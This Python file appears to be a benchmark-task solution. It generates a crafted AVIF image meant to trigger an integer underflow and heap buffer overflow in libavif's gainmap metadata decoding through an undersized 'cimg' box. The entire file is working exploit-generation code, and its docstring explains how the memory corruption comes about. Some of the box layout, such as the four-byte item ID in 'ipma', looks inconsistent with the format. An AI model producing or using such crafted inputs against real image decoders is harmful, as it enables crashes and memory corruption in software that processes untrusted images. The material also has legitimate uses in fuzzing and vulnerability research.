import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in the decodeGainmapMetadata()
        function of libavif, caused by an integer underflow. The code calculates
        a metadata size with `metadataBox->size - offset`, where `offset` is 32
        (the size of the parsed header) and `metadataBox->size` is the payload
        size of a 'cimg' box.

        To trigger the underflow, `metadataBox->size` must be less than 32.
        We can achieve this by creating a 'cimg' box with a total size of 8 bytes
        (the minimum for a box header), which results in a payload size of 0.
        The calculation `0 - 32` underflows `size_t`, resulting in a very large
        value for the metadata size. This large size is then used in a memory
        operation, causing a heap buffer overflow.

        The PoC constructs a minimal AVIF file structure to ensure the parser
        reaches the vulnerable function with our malicious 'cimg' box.
        """

        def make_box(box_type: bytes, content: bytes) -> bytes:
            """Creates an ISOBMFF box."""
            size = 8 + len(content)
            return struct.pack('>I', size) + box_type + content

        def make_full_box(box_type: bytes, version_flags: int, content: bytes) -> bytes:
            """Creates an ISOBMFF full box (with version and flags)."""
            size = 12 + len(content)
            return struct.pack('>I', size) + box_type + struct.pack('>I', version_flags) + content

        # 'ftyp' box: Standard file type box for AVIF.
        ftyp = make_box(b'ftyp', b'avif\x00\x00\x00\x00avifmif1')

        # 'hdlr' box: Declares the handler type as 'pict' (picture).
        hdlr_content = b'\x00\x00\x00\x00pict' + b'\x00' * 12 + b'\x00'
        hdlr = make_full_box(b'hdlr', 0, hdlr_content)

        # 'iinf' and 'infe' boxes: Define a single image item (itemID 1).
        infe_content = b'\x00\x01' + b'\x00\x00' + b'avif'
        infe = make_full_box(b'infe', 2 << 24, infe_content)
        iinf_content = b'\x00\x01' + infe
        iinf = make_full_box(b'iinf', 0, iinf_content)

        # The malicious 'cimg' box with size 8, leading to a 0-byte payload.
        cimg_box = b'\x00\x00\x00\x08cimg'
        
        # 'ipco' box: Contains the item properties, in this case, our 'cimg' box.
        ipco = make_box(b'ipco', cimg_box)
        
        # 'ipma' box: Associates the property (cimg) with the image item (itemID 1).
        ipma_content = (
            b'\x00\x00\x00\x01'  # entry_count
            b'\x00\x00\x00\x01'  # item_ID
            b'\x00\x01'          # association_count
            b'\x80\x01'          # essential=true, property_index=1
        )
        ipma = make_full_box(b'ipma', 0, ipma_content)
        
        # 'iprp' box: Container for property-related boxes.
        iprp = make_box(b'iprp', ipco + ipma)

        # 'meta' box: Top-level container for metadata.
        meta_content = hdlr + iinf + iprp
        meta = make_full_box(b'meta', 0, meta_content)

        poc = ftyp + meta
        return poc